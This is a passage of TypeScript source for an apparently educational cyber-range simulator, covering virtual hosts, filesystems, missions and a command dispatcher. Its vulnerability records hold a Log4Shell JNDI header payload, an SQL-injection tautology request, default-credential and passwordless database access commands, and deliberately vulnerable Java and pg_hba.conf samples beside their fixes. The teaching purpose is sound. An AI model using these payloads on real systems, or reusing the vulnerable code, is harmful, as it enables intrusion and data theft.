/**
 * Virtual Linux & Java Operating System and Network Simulation Engine
 * Handles virtual filesystem, networking, vulnerability auditing, missions, and command execution.
 */

import {
  VFile,
  NetworkHost,
  Vulnerability,
  AcademyMission,
  TerminalOutputLine,
  EditorState
} from '../types/cyber';
import { soundEngine } from '../services/soundEngine';

export class VirtualOS {
  public hosts: Record<string, NetworkHost>;
  public currentHostIp: string = '127.0.0.1';
  public currentUser: string = 'student';
  public currentPath: string = '/home/student';
  public commandHistory: string[] = [];
  public currentMissionIndex: number = 0;
  public hintTokens: number = 1;
  private rewardedMissionIds: Set<number> = new Set();
  public missions: AcademyMission[];
  public editorState: EditorState = {
    isOpen: false,
    filePath: '',
    initialContent: '',
    currentContent: '',
    cursorLine: 0,
    isSaved: true
  };

  constructor() {
    this.hosts = this.createDefaultNetwork();
    this.missions = this.createAcademyMissions();
  }

  // --- Initial Network & Filesystem Setup ---

  private createDefaultNetwork(): Record<string, NetworkHost> {
    const localhost: NetworkHost = {
      id: 'local',
      ip: '127.0.0.1',
      hostname: 'cyberbox',
      os: 'Debian GNU/Linux 12 (bookworm)',
      role: 'Student Workstation / Pentest Rig',
      isLocal: true,
      isDiscovered: true,
      isCompromised: false,
      isHardened: true,
      ports: [
        { port: 22, protocol: 'TCP', service: 'ssh', version: 'OpenSSH 9.2p1', state: 'open' }
      ],
      vulnerabilities: [],
      firewallRules: [{ port: 22, action: 'ALLOW' }],
      filesystem: this.createLocalFilesystem()
    };

    const router: NetworkHost = {
      id: 'router',
      ip: '192.168.1.1',
      hostname: 'gateway-router',
      os: 'OpenWrt 23.05 Linux 5.15',
      role: 'Network Gateway & Firewall',
      isLocal: false,
      isDiscovered: true,
      isCompromised: false,
      isHardened: false,
      ports: [
        { port: 80, protocol: 'TCP', service: 'http', version: 'uHTTPd 2023.1', state: 'open', banner: 'Gateway Portal v1.2' },
        { port: 53, protocol: 'UDP', service: 'domain', version: 'dnsmasq-2.89', state: 'open' }
      ],
      vulnerabilities: [
        {
          id: 'VULN-ROUTER-01',
          title: 'Default Administrative Credentials',
          category: 'Broken Auth',
          severity: 'HIGH',
          cvss: 7.5,
          targetService: 'uHTTPd Web Interface',
          port: 80,
          description: 'Gateway administrator portal is secured with default credentials "admin:admin" or "root:root".',
          exploitVector: 'curl -u admin:admin http://192.168.1.1/api/config',
          preventionGuide: 'Enforce strong, unique passwords at initial setup, disable remote web management, and enable multi-factor authentication (MFA).',
          isExploited: false,
          isPatched: false
        }
      ],
      firewallRules: [],
      filesystem: this.createRouterFilesystem()
    };

    const javaApiHost: NetworkHost = {
      id: 'bank-api',
      ip: '10.0.0.50',
      hostname: 'bankcorp-api',
      os: 'Ubuntu 22.04 LTS (Jammy Jellyfish)',
      role: 'Spring Boot Banking Backend (Java 17)',
      isLocal: false,
      isDiscovered: false,
      isCompromised: false,
      isHardened: false,
      ports: [
        { port: 22, protocol: 'TCP', service: 'ssh', version: 'OpenSSH 8.9p1', state: 'open' },
        { port: 8080, protocol: 'TCP', service: 'http-alt', version: 'Spring Boot 2.5.4 / Apache Tomcat 9.0', state: 'open', banner: 'BankCorp REST API v2.4 (JVM HotSpot)' }
      ],
      vulnerabilities: [
        {
          id: 'CVE-2021-44228',
          title: 'Log4Shell - JNDI Remote Code Execution',
          category: 'Injection',
          severity: 'CRITICAL',
          cvss: 10.0,
          targetService: 'Apache Log4j 2.14.1 on Java 17',
          port: 8080,
          description: 'Log4j versions <= 2.14.1 evaluate JNDI lookup strings like "${jndi:ldap:...}" inside HTTP headers, leading to unauthenticated arbitrary remote code execution.',
          exploitVector: 'curl -H "X-Api-Version: ${jndi:ldap://127.0.0.1:1389/Exploit}" http://10.0.0.50:8080/api/login',
          preventionGuide: 'Upgrade to Log4j >= 2.17.1, pass system property -Dlog4j2.formatMsgNoLookups=true, or use parameterized loggers without string interpolation.',
          vulnerableCodeSample: `// Vulnerable Log4j Logging:\nlogger.info("Login attempt from client version: " + clientHeader);`,
          secureCodeSample: `// Secure Parameterized Logging:\nlogger.info("Login attempt from client version: {}", sanitize(clientHeader));`,
          isExploited: false,
          isPatched: false
        },
        {
          id: 'CWE-89',
          title: 'SQL Injection in User Authentication Endpoint',
          category: 'Injection',
          severity: 'CRITICAL',
          cvss: 9.8,
          targetService: 'Spring Boot AuthController (/api/auth/login)',
          port: 8080,
          description: 'User input from username parameter is concatenated directly into SQL query without parameterization, allowing auth bypass via "\' OR 1=1 --".',
          exploitVector: `curl -X POST -d "username=' OR 1=1 --&password=x" http://10.0.0.50:8080/api/auth/login`,
          preventionGuide: 'Use PreparedStatements with bind parameters (PreparedStatement pstmt = conn.prepareStatement("SELECT * FROM users WHERE user = ?");) or an ORM like Spring Data JPA / Hibernate.',
          vulnerableCodeSample: `String sql = "SELECT * FROM users WHERE username = '" + username + "' AND pass = '" + password + "'";\nStatement stmt = conn.createStatement();\nResultSet rs = stmt.executeQuery(sql);`,
          secureCodeSample: `String sql = "SELECT * FROM users WHERE username = ? AND pass = ?";\nPreparedStatement pstmt = conn.prepareStatement(sql);\npstmt.setString(1, username);\npstmt.setString(2, hashPassword(password));\nResultSet rs = pstmt.executeQuery();`,
          isExploited: false,
          isPatched: false
        }
      ],
      firewallRules: [{ port: 22, action: 'ALLOW' }, { port: 8080, action: 'ALLOW' }],
      filesystem: this.createJavaServerFilesystem()
    };

    const dbHost: NetworkHost = {
      id: 'bank-db',
      ip: '10.0.0.100',
      hostname: 'bankcorp-vault-db',
      os: 'Rocky Linux 9.2 (Blue Onyx)',
      role: 'Production PostgreSQL Database Server',
      isLocal: false,
      isDiscovered: false,
      isCompromised: false,
      isHardened: false,
      ports: [
        { port: 22, protocol: 'TCP', service: 'ssh', version: 'OpenSSH 8.7p1', state: 'open' },
        { port: 5432, protocol: 'TCP', service: 'postgresql', version: 'PostgreSQL 14.8', state: 'open', banner: 'PostgreSQL DB' }
      ],
      vulnerabilities: [
        {
          id: 'CWE-284',
          title: 'Unrestricted Remote Database Access & Weak Passwords',
          category: 'Misconfiguration',
          severity: 'HIGH',
          cvss: 8.5,
          targetService: 'PostgreSQL Database',
          port: 5432,
          description: 'pg_hba.conf is configured with "host all all 0.0.0.0/0 trust", permitting any network client to connect without password authentication.',
          exploitVector: 'psql -h 10.0.0.100 -U postgres -d customer_vault',
          preventionGuide: 'Restrict database listening address to 127.0.0.1 or internal private subnet, use scram-sha-256 password authentication, and enable firewall isolation.',
          isExploited: false,
          isPatched: false
        }
      ],
      firewallRules: [{ port: 22, action: 'ALLOW' }, { port: 5432, action: 'ALLOW' }],
      filesystem: this.createDbFilesystem()
    };

    return {
      '127.0.0.1': localhost,
      '192.168.1.1': router,
      '10.0.0.50': javaApiHost,
      '10.0.0.100': dbHost
    };
  }

  // --- Filesystems ---

  private createLocalFilesystem(): VFile {
    return {
      name: '/',
      type: 'dir',
      permissions: 'rwxr-xr-x',
      owner: 'root',
      group: 'root',
      size: 4096,
      modified: 'Oct 25 10:00',
      children: {
        home: {
          name: 'home',
          type: 'dir',
          permissions: 'rwxr-xr-x',
          owner: 'root',
          group: 'root',
          size: 4096,
          modified: 'Oct 25 10:00',
          children: {
            student: {
              name: 'student',
              type: 'dir',
              permissions: 'rwxr-xr-x',
              owner: 'student',
              group: 'student',
              size: 4096,
              modified: 'Oct 25 10:05',
              children: {
                'welcome.txt': {
                  name: 'welcome.txt',
                  type: 'file',
                  permissions: 'rw-r--r--',
                  owner: 'student',
                  group: 'student',
                  size: 480,
                  modified: 'Oct 25 10:00',
                  content: `========================================================\n  CYBERBOX SECURITY WORKSTATION (Linux 6.1 / Java 21)\n========================================================\nWelcome to your sandbox terminal!\n\nQuick CLI Starter Commands:\n  ls -la     : List all directory contents, permissions, & hidden files\n  pwd        : Print working directory path\n  cat <file> : Display contents of a text file\n  nmap <ip>  : Scan a target host for open ports and services\n  curl <url> : Send HTTP requests to test web APIs\n  vulnscan   : Audit the current host or network target for CVEs\n  mission    : Check current Academy learning objective\n  help       : View complete list of available CLI tools\n========================================================`
                },
                'cheatsheet.txt': {
                  name: 'cheatsheet.txt',
                  type: 'file',
                  permissions: 'rw-r--r--',
                  owner: 'student',
                  group: 'student',
                  size: 720,
                  modified: 'Oct 25 10:00',
                  content: `--- CYBER TERMINAL CHEAT SHEET ---\n\n1. Filesystem:\n   ls -la              -> Detailed list with hidden files\n   cd /path/to/dir     -> Change directory\n   cat file.txt        -> View file\n   grep "keyword" log  -> Filter log or text by pattern\n   chmod 600 key.pem   -> Secure file permissions\n\n2. Network & Reconnaissance:\n   ping 192.168.1.1    -> Test host reachability\n   nmap -sV 10.0.0.50  -> Port scan with version banners\n   curl http://ip:port -> Fetch web endpoints\n   ssh user@ip         -> Secure Shell remote login\n\n3. Security & Defense:\n   vulnscan <ip>       -> Identify CVEs & CVSS score\n   nano <file>         -> In-terminal text editor for patching\n   ufw status          -> Check firewall rules\n   ufw deny 8080       -> Block malicious port`
                },
                '.bash_history': {
                  name: '.bash_history',
                  type: 'file',
                  permissions: 'rw-------',
                  owner: 'student',
                  group: 'student',
                  size: 210,
                  modified: 'Oct 25 09:30',
                  content: `ls -la\ncd projects\njavac VulnerableApp.java\njava VulnerableApp\nping 192.168.1.1\ncat .env\nssh admin@192.168.1.1`
                },
                '.env': {
                  name: '.env',
                  type: 'file',
                  permissions: 'rw-r--r--',
                  owner: 'student',
                  group: 'student',
                  size: 140,
                  modified: 'Oct 25 09:15',
                  content: `API_SECRET_KEY="sk_live_99482710492817203"\nDATABASE_URL="postgres://student:CyberSecretPass2026@10.0.0.100:5432/bank_db"\nGATEWAY_BACKDOOR="admin:admin"`
                },
                scripts: {
                  name: 'scripts',
                  type: 'dir',
                  permissions: 'rwxr-xr-x',
                  owner: 'student',
                  group: 'student',
                  size: 4096,
                  modified: 'Oct 25 10:00',
                  children: {
                    'portscan.sh': {
                      name: 'portscan.sh',
                      type: 'file',
                      permissions: 'rwxr-xr-x',
                      owner: 'student',
                      group: 'student',
                      size: 320,
                      modified: 'Oct 25 10:00',
                      isExecutable: true,
                      content: `#!/bin/bash\n# Quick subnet reconnaissance scanner\necho "Scanning local subnet 10.0.0.0/24..."\nnmap -sV 10.0.0.50\nnmap -sV 10.0.0.100`
                    }
                  }
                }
              }
            }
          }
        },
        etc: {
          name: 'etc',
          type: 'dir',
          permissions: 'rwxr-xr-x',
          owner: 'root',
          group: 'root',
          size: 4096,
          modified: 'Oct 25 10:00',
          children: {
            passwd: {
              name: 'passwd',
              type: 'file',
              permissions: 'rw-r--r--',
              owner: 'root',
              group: 'root',
              size: 380,
              modified: 'Oct 25 10:00',
              content: `root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nstudent:x:1000:1000:Cyber Student,,,:/home/student:/bin/bash\nguest:x:1001:1001:Guest Account:/home/guest:/bin/bash`
            },
            sudoers: {
              name: 'sudoers',
              type: 'file',
              permissions: 'r--r-----',
              owner: 'root',
              group: 'root',
              size: 290,
              modified: 'Oct 25 10:00',
              content: `# /etc/sudoers file\nroot ALL=(ALL:ALL) ALL\n%sudo ALL=(ALL:ALL) ALL\nstudent ALL=(ALL) NOPASSWD: /usr/bin/cat, /usr/bin/nmap, /usr/bin/find`
            },
            hosts: {
              name: 'hosts',
              type: 'file',
              permissions: 'rw-r--r--',
              owner: 'root',
              group: 'root',
              size: 210,
              modified: 'Oct 25 10:00',
              content: `127.0.0.1   localhost cyberbox\n192.168.1.1 gateway.local router\n10.0.0.50   bank-api.internal\n10.0.0.100  bank-vault.internal`
            }
          }
        },
        var: {
          name: 'var',
          type: 'dir',
          permissions: 'rwxr-xr-x',
          owner: 'root',
          group: 'root',
          size: 4096,
          modified: 'Oct 25 10:00',
          children: {
            log: {
              name: 'log',
              type: 'dir',
              permissions: 'rwxr-xr-x',
              owner: 'root',
              group: 'root',
              size: 4096,
              modified: 'Oct 25 10:00',
              children: {
                'auth.log': {
                  name: 'auth.log',
                  type: 'file',
                  permissions: 'rw-r-----',
                  owner: 'root',
                  group: 'adm',
                  size: 1450,
                  modified: 'Oct 25 10:10',
                  content: `Oct 25 09:41:02 cyberbox sshd[2811]: Failed password for invalid user root from 172.16.4.20 port 49152 ssh2\nOct 25 09:41:05 cyberbox sshd[2813]: Failed password for invalid user admin from 172.16.4.20 port 49154 ssh2\nOct 25 09:41:08 cyberbox sshd[2815]: Failed password for student from 172.16.4.20 port 49156 ssh2\nOct 25 09:41:12 cyberbox sshd[2818]: Received disconnect from 172.16.4.20: 11: Bye Bye [preauth]\nOct 25 10:00:15 cyberbox sudo: student : TTY=pts/0 ; PWD=/home/student ; USER=root ; COMMAND=/usr/bin/cat /etc/hosts\nOct 25 10:05:22 cyberbox sshd[3102]: Accepted password for student from 127.0.0.1 port 52190 ssh2`
                }
              }
            }
          }
        }
      }
    };
  }

  private createRouterFilesystem(): VFile {
    return {
      name: '/',
      type: 'dir',
      permissions: 'rwxr-xr-x',
      owner: 'root',
      group: 'root',
      size: 4096,
      modified: 'Oct 25 10:00',
      children: {
        etc: {
          name: 'etc',
          type: 'dir',
          permissions: 'rwxr-xr-x',
          owner: 'root',
          group: 'root',
          size: 4096,
          modified: 'Oct 25 10:00',
          children: {
            config: {
              name: 'config',
              type: 'dir',
              permissions: 'rwxr-xr-x',
              owner: 'root',
              group: 'root',
              size: 4096,
              modified: 'Oct 25 10:00',
              children: {
                network: {
                  name: 'network',
                  type: 'file',
                  permissions: 'rw-r--r--',
                  owner: 'root',
                  group: 'root',
                  size: 260,
                  modified: 'Oct 25 10:00',
                  content: `config interface 'lan'\n  option proto 'static'\n  option ipaddr '192.168.1.1'\n  option netmask '255.255.255.0'\n\nconfig interface 'wan'\n  option proto 'dhcp'\n  option ifname 'eth1'`
                }
              }
            }
          }
        }
      }
    };
  }

  private createJavaServerFilesystem(): VFile {
    return {
      name: '/',
      type: 'dir',
      permissions: 'rwxr-xr-x',
      owner: 'root',
      group: 'root',
      size: 4096,
      modified: 'Oct 25 10:00',
      children: {
        opt: {
          name: 'opt',
          type: 'dir',
          permissions: 'rwxr-xr-x',
          owner: 'root',
          group: 'root',
          size: 4096,
          modified: 'Oct 25 10:00',
          children: {
            bankapi: {
              name: 'bankapi',
              type: 'dir',
              permissions: 'rwxr-xr-x',
              owner: 'developer',
              group: 'developer',
              size: 4096,
              modified: 'Oct 25 10:00',
              children: {
                'AuthService.java': {
                  name: 'AuthService.java',
                  type: 'file',
                  permissions: 'rw-r--r--',
                  owner: 'developer',
                  group: 'developer',
                  size: 890,
                  modified: 'Oct 25 10:00',
                  content: `package com.bankcorp.api;\n\nimport java.sql.Connection;\nimport java.sql.ResultSet;\nimport java.sql.Statement;\n\npublic class AuthService {\n    // [VULNERABILITY: CWE-89 SQL Injection]\n    // Raw string concatenation allows injection like ' OR 1=1 --\n    public boolean authenticate(Connection conn, String user, String pass) throws Exception {\n        String sql = "SELECT id, role FROM accounts WHERE username = '" + user + "' AND password = '" + pass + "'";\n        Statement stmt = conn.createStatement();\n        ResultSet rs = stmt.executeQuery(sql);\n        return rs.next();\n    }\n}`
                },
                'AuthServiceSecured.java': {
                  name: 'AuthServiceSecured.java',
                  type: 'file',
                  permissions: 'rw-r--r--',
                  owner: 'developer',
                  group: 'developer',
                  size: 960,
                  modified: 'Oct 25 10:00',
                  content: `package com.bankcorp.api;\n\nimport java.sql.Connection;\nimport java.sql.PreparedStatement;\nimport java.sql.ResultSet;\n\npublic class AuthServiceSecured {\n    // [SECURE DEFENSE]: Parameterized Query via PreparedStatement\n    public boolean authenticate(Connection conn, String user, String pass) throws Exception {\n        String sql = "SELECT id, role FROM accounts WHERE username = ? AND password = ?";\n        try (PreparedStatement pstmt = conn.prepareStatement(sql)) {\n            pstmt.setString(1, user);\n            pstmt.setString(2, pass);\n            try (ResultSet rs = pstmt.executeQuery()) {\n                return rs.next();\n            }\n        }\n    }\n}`
                },
                'log4j2.xml': {
                  name: 'log4j2.xml',
                  type: 'file',
                  permissions: 'rw-r--r--',
                  owner: 'developer',
                  group: 'developer',
                  size: 450,
                  modified: 'Oct 25 10:00',
                  content: `<?xml version="1.0" encoding="UTF-8"?>\n<Configuration status="WARN">\n  <!-- VULNERABLE: No msg lookup disabling -->\n  <Appenders>\n    <Console name="Console" target="SYSTEM_OUT">\n      <PatternLayout pattern="%d{HH:mm:ss.SSS} [%t] %-5level %logger{36} - %msg%n"/>\n    </Console>\n  </Appenders>\n  <Loggers>\n    <Root level="info">\n      <AppenderRef ref="Console"/>\n    </Root>\n  </Loggers>\n</Configuration>`
                }
              }
            }
          }
        }
      }
    };
  }

  private createDbFilesystem(): VFile {
    return {
      name: '/',
      type: 'dir',
      permissions: 'rwxr-xr-x',
      owner: 'root',
      group: 'root',
      size: 4096,
      modified: 'Oct 25 10:00',
      children: {
        var: {
          name: 'var',
          type: 'dir',
          permissions: 'rwxr-xr-x',
          owner: 'root',
          group: 'root',
          size: 4096,
          modified: 'Oct 25 10:00',
          children: {
            lib: {
              name: 'lib',
              type: 'dir',
              permissions: 'rwxr-xr-x',
              owner: 'postgres',
              group: 'postgres',
              size: 4096,
              modified: 'Oct 25 10:00',
              children: {
                data: {
                  name: 'data',
                  type: 'dir',
                  permissions: 'rwx------',
                  owner: 'postgres',
                  group: 'postgres',
                  size: 4096,
                  modified: 'Oct 25 10:00',
                  children: {
                    'pg_hba.conf': {
                      name: 'pg_hba.conf',
                      type: 'file',
                      permissions: 'rw-------',
                      owner: 'postgres',
                      group: 'postgres',
                      size: 280,
                      modified: 'Oct 25 10:00',
                      content: `# PostgreSQL Client Authentication Configuration\n# VULNERABLE: trust authentication for any remote host\nhost    all             all             0.0.0.0/0               trust`
                    }
                  }
                }
              }
            }
          }
        }
      }
    };
  }

  // --- Academy Missions ---

  private createAcademyMissions(): AcademyMission[] {
    return [
      {
        id: 1,
        title: 'Incident 101: Workstation Reconnaissance & Leaked Dotfiles',
        subtitle: 'Investigate your workstation filesystem and discover unencrypted secrets',
        difficulty: 'Beginner',
        category: 'CLI Fundamentals',
        description: 'A routine compliance scan flagged an unencrypted configuration file left behind on this developer workstation. You must investigate the environment on your own, locate the omitted dotfiles, and extract the leaked credentials.',
        objective: 'Identify your working path and account, discover hidden files omitted by default listings, and extract the secret token.',
        learningOutcome: 'Understanding Linux paths, file permissions, hidden dotfiles (.env), and discovering credential leaks.',
        investigativeSuggestion: 'Suggestion: Standard directory listings omit dotfiles (`.`). Try listing your current directory with all files revealed, then examine their contents.',
        isHintUnlocked: false,
        targetHostIp: '127.0.0.1',
        steps: [
          {
            id: 's1_1',
            instruction: 'Identify your current filesystem path and verify which user account you are operating as.',
            explanation: 'Print your current directory and verify your user identity.',
            completed: false,
            validator: (cmd) => /pwd|whoami|id/i.test(cmd)
          },
          {
            id: 's1_2',
            instruction: 'Investigate the current directory to locate files that are normally hidden from standard listings.',
            explanation: 'Listing all entries reveals hidden dotfiles used for configuration.',
            completed: false,
            validator: (cmd) => /ls\s+(-[a-zA-Z]*a[a-zA-Z]*)/i.test(cmd)
          },
          {
            id: 's1_3',
            instruction: 'Inspect the discovered hidden environment file to find and extract the leaked database secret.',
            explanation: 'Reading the contents of sensitive dotfiles reveals confidential secrets.',
            completed: false,
            validator: (cmd) => /cat\s+(\.\/)?\.env/i.test(cmd)
          }
        ]
      },
      {
        id: 2,
        title: 'Incident 202: Subnet Reconnaissance & Service Identification',
        subtitle: 'Map network nodes, discover open services, and audit CVE ratings',
        difficulty: 'Beginner',
        category: 'Network Reconnaissance',
        description: 'Our subnet connects several unmapped virtual machines. You must discover the gateway, test communication, determine which internal host runs an exposed Java microservice, and audit it for known vulnerabilities.',
        objective: 'Discover the gateway router, perform port and version reconnaissance on the banking host, and run an automated vulnerability assessment.',
        learningOutcome: 'Understanding TCP/UDP ports, service banner reconnaissance, and matching services against CVE databases.',
        investigativeSuggestion: 'Suggestion: Try checking your Network Map tab or `/etc/hosts` to identify target IP addresses. Then test ping connectivity and run port/service discovery.',
        isHintUnlocked: false,
        targetHostIp: '192.168.1.1',
        steps: [
          {
            id: 's2_1',
            instruction: 'Confirm network reachability to the subnet gateway router (192.168.1.1).',
            explanation: 'Sending ICMP echo probes verifies network route availability.',
            completed: false,
            validator: (cmd) => /ping\s+192\.168\.1\.1/i.test(cmd)
          },
          {
            id: 's2_2',
            instruction: 'Perform service and version reconnaissance on the banking API host (10.0.0.50) to map listening ports.',
            explanation: 'Banner grabbing identifies the server software, JVM version, and active application ports.',
            completed: false,
            validator: (cmd) => /nmap.*10\.0\.0\.50/i.test(cmd)
          },
          {
            id: 's2_3',
            instruction: 'Execute a vulnerability audit on the discovered banking host to identify critical CVE ratings.',
            explanation: 'Scanning matched services reveals published exploits and CVSS threat levels.',
            completed: false,
            validator: (cmd) => /vulnscan\s+10\.0\.0\.50/i.test(cmd)
          }
        ]
      },
      {
        id: 3,
        title: 'Incident 303: Web API Authentication Tautology Flaw',
        subtitle: 'Analyze the authentication endpoint, craft a boolean bypass, and harden the database query',
        difficulty: 'Intermediate',
        category: 'Web Application Security',
        description: 'The banking authentication servlet concatenates incoming client parameters directly into backend database queries. You need to investigate the login endpoint, test for SQL syntax breakage, and enforce parameterization.',
        objective: 'Probe the authentication endpoint, verify vulnerability with a boolean tautology payload, and apply the defensive parameterized patch.',
        learningOutcome: 'Understanding SQL injection mechanics and how JDBC PreparedStatements separate code from user data.',
        investigativeSuggestion: 'Suggestion: Check the web endpoint responses with a client request tool. Notice how single quotes affect SQL syntax, and how a boolean tautology (`1=1`) alters query logic.',
        isHintUnlocked: false,
        targetHostIp: '10.0.0.50',
        steps: [
          {
            id: 's3_1',
            instruction: 'Interact with the banking service login endpoint on port 8080 to observe its HTTP response.',
            explanation: 'Inspecting HTTP response headers and status codes reveals endpoint structure.',
            completed: false,
            validator: (cmd) => /curl.*10\.0\.0\.50:8080/i.test(cmd)
          },
          {
            id: 's3_2',
            instruction: 'Test the authentication handler with a boolean tautology payload that forces the SQL check to evaluate true.',
            explanation: 'Injecting boolean clauses into unsanitized SQL strings bypasses password validation.',
            completed: false,
            validator: (cmd) => /1=1/i.test(cmd) && /POST/i.test(cmd)
          },
          {
            id: 's3_3',
            instruction: 'Apply the defensive patch that replaces dynamic SQL concatenation with parameterized queries.',
            explanation: 'PreparedStatement compilation neutralizes user injection attempts.',
            completed: false,
            validator: (cmd) => /patch\s+CWE-89/i.test(cmd)
          }
        ]
      },
      {
        id: 4,
        title: 'Incident 404: Remote JNDI Lookup Vulnerability (Log4Shell)',
        subtitle: 'Investigate the Log4j JNDI lookup flaw, simulate the header injection, and remediate the logger',
        difficulty: 'Advanced',
        category: 'Java Vulnerabilities',
        description: 'The backend container runs an unpatched Apache Log4j library vulnerable to JNDI remote code execution. Investigate the vulnerability profile, trigger the header lookup, and remediate the logging framework.',
        objective: 'Audit the Log4Shell CVE dossier, simulate the remote JNDI lookup probe in request headers, and apply defensive configuration.',
        learningOutcome: 'Deconstructing message lookup flaws in Java frameworks and disabling unsafe JNDI lookups.',
        investigativeSuggestion: 'Suggestion: Investigate CVE-2021-44228 in the vulnerability radar. Observe which HTTP header the logging framework inspects and what lookup string format `${jndi:...}` it evaluates.',
        isHintUnlocked: false,
        targetHostIp: '10.0.0.50',
        steps: [
          {
            id: 's4_1',
            instruction: 'Query the vulnerability assessment system for the Log4Shell CVE dossier to review its CVSS score and attack vector.',
            explanation: 'Reviewing the CVE technical details explains the recursive JNDI lookup mechanism.',
            completed: false,
            validator: (cmd) => /vulnscan.*CVE-2021-44228/i.test(cmd)
          },
          {
            id: 's4_2',
            instruction: 'Send a simulated request injecting the JNDI lookup directive into the client version header of the banking API.',
            explanation: 'Sending ${jndi:ldap:...} inside headers tests if the logging system evaluates expressions.',
            completed: false,
            validator: (cmd) => /jndi:ldap/i.test(cmd)
          },
          {
            id: 's4_3',
            instruction: 'Apply the defensive mitigation to disable message lookups and patch the logging configuration.',
            explanation: 'Setting formatMsgNoLookups=true or upgrading the library eliminates the attack surface.',
            completed: false,
            validator: (cmd) => /patch.*CVE-2021-44228/i.test(cmd)
          }
        ]
      },
      {
        id: 5,
        title: 'Incident 505: Unauthorized Ingress & Incident Response',
        subtitle: 'Audit authentication logs, isolate the adversary IP, and configure firewall drop rules',
        difficulty: 'Intermediate',
        category: 'System Hardening',
        description: 'An external adversary is actively brute-forcing workstation accounts. You must investigate authentication logs, identify the attacker\'s IP address, and enforce firewall drop rules.',
        objective: 'Analyze auth.log to detect unauthorized intrusion attempts, extract the attacker IP, and drop incoming packets using the firewall.',
        learningOutcome: 'Log forensics, pattern searching with grep, and host-based netfilter packet filtering with UFW.',
        investigativeSuggestion: 'Suggestion: System authentication records reside in `/var/log/auth.log`. Use pattern searching with `grep` to find "Failed password" lines, then block the rogue IP with the host firewall (`ufw`).',
        isHintUnlocked: false,
        targetHostIp: '127.0.0.1',
        steps: [
          {
            id: 's5_1',
            instruction: 'Search the authentication logs to locate repeated failed login attempts and isolate the attacker\'s IP address.',
            explanation: 'Searching auth logs exposes unauthorized brute-force origins.',
            completed: false,
            validator: (cmd) => /grep.*Failed.*auth\.log/i.test(cmd)
          },
          {
            id: 's5_2',
            instruction: 'Configure the host firewall to completely drop and reject all ingress network traffic from the rogue IP.',
            explanation: 'Adding a firewall drop rule blocks the hostile actor at the packet filter level.',
            completed: false,
            validator: (cmd) => /ufw\s+deny\s+from\s+172\.16\.4\.20/i.test(cmd)
          },
          {
            id: 's5_3',
            instruction: 'Verify the active firewall status and ensure the blocking rule is in effect.',
            explanation: 'Confirming firewall policies ensures ingress filtering is actively enforced.',
            completed: false,
            validator: (cmd) => /ufw\s+status/i.test(cmd)
          }
        ]
      }
    ];
  }

  // --- Command Execution Dispatcher ---

  public executeCommand(inputRaw: string): TerminalOutputLine[] {
    const trimmed = inputRaw.trim();
    if (!trimmed) return [];

    this.commandHistory.push(trimmed);
    const host = this.hosts[this.currentHostIp];
    const prompt = `${this.currentUser}@${host.hostname}:${this.currentPath}$`;

    const tokens = this.parseCommandLine(trimmed);
    const cmd = tokens[0]?.toLowerCase();
    const args = tokens.slice(1);

    soundEngine.playEnterKey();

    let outputLines: TerminalOutputLine[] = [
      { id: String(Date.now()), type: 'input', text: trimmed, prompt }
    ];

    try {
      const result = this.dispatchCommand(cmd, args, trimmed);
      outputLines = outputLines.concat(result);

      // Check mission step completion!
      this.checkMissionProgress(trimmed, result.map((r) => r.text).join('\n'), host);
    } catch (err: unknown) {
      soundEngine.playError();
      const message = err instanceof Error ? err.message : 'Unknown execution fault';
      outputLines.push({
        id: String(Date.now() + 1),
        type: 'error',
        text: `bash: ${message}`
      });
    }

    return outputLines;
  }

  private dispatchCommand(cmd: string, args: string[], rawCmd: string): TerminalOutputLine[] {
    const host = this.hosts[this.currentHostIp];

    switch (cmd) {
      case 'help':
        soundEngine.playSuccess();
        return [
          {
            id: String(Date.now()),
            type: 'system',
            text: `========================================================================\n  CYBERSANDBOX CLI & SECURITY SUITE (Available Commands)\n========================================================================\n  Core Navigation:  ls, cd, pwd, cat, mkdir, rm, cp, mv, echo, clear\n  File Inspection:  grep, chmod, find, diff, nano (in-terminal editor)\n  Network & Recon:  ping, nmap, curl, ssh, dig, netstat, ufw\n  Vulnerability:    vulnscan, patch, hashcrack\n  Java Dev & Sec:   javac, java, javap, jps, jshell, mvn test\n  System & User:    whoami, id, sudo, su, uname, date, history\n  Academy Training: mission, hint, next, prev\n\n  Type 'man <command>' or 'help <command>' for detailed command manual.\n========================================================================`
          }
        ];

      case 'clear':
        return [{ id: String(Date.now()), type: 'system', text: '__CLEAR__' }];

      case 'pwd':
        return [{ id: String(Date.now()), type: 'output', text: this.currentPath }];

      case 'whoami':
        return [{ id: String(Date.now()), type: 'output', text: this.currentUser }];

      case 'id':
        const uid = this.currentUser === 'root' ? 0 : 1000;
        return [
          {
            id: String(Date.now()),
            type: 'output',
            text: `uid=${uid}(${this.currentUser}) gid=${uid}(${this.currentUser}) groups=${uid}(${this.currentUser})${this.currentUser === 'student' ? ',27(sudo),100(users)' : ''}`
          }
        ];

      case 'uname':
        const isAll = args.includes('-a');
        return [
          {
            id: String(Date.now()),
            type: 'output',
            text: isAll
              ? `Linux ${host.hostname} 6.1.0-18-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.76-1 x86_64 GNU/Linux`
              : 'Linux'
          }
        ];

      case 'date':
        return [{ id: String(Date.now()), type: 'output', text: new Date().toUTCString() }];

      case 'history':
        return [
          {
            id: String(Date.now()),
            type: 'output',
            text: this.commandHistory.map((h, i) => `  ${i + 1}  ${h}`).join('\n')
          }
        ];

      // --- Filesystem Commands ---

      case 'ls': {
        const showAll = args.some((a) => a.includes('a'));
        const longListing = args.some((a) => a.includes('l'));
        const targetPath = args.find((a) => !a.startsWith('-')) || this.currentPath;

        const dir = this.resolveDirectory(targetPath);
        if (!dir || dir.type !== 'dir' || !dir.children) {
          throw new Error(`ls: cannot access '${targetPath}': No such file or directory`);
        }

        const entries = Object.values(dir.children).filter((item) => {
          if (!showAll && item.name.startsWith('.')) return false;
          return true;
        });

        if (longListing) {
          const lines = entries.map((item) => {
            const prefix = item.type === 'dir' ? 'd' : '-';
            return `${prefix}${item.permissions}  1  ${item.owner}  ${item.group}  ${item.size.toString().padStart(6)}  ${item.modified}  ${item.name}${item.isExecutable ? '*' : item.type === 'dir' ? '/' : ''}`;
          });
          return [{ id: String(Date.now()), type: 'output', text: `total ${entries.length * 4}\n` + lines.join('\n') }];
        } else {
          const names = entries.map((item) => item.name + (item.type === 'dir' ? '/' : ''));
          return [{ id: String(Date.now()), type: 'output', text: names.join('   ') }];
        }
      }

      case 'cd': {
        const dest = args[0] || '/home/student';
        const target = this.resolvePathString(dest);
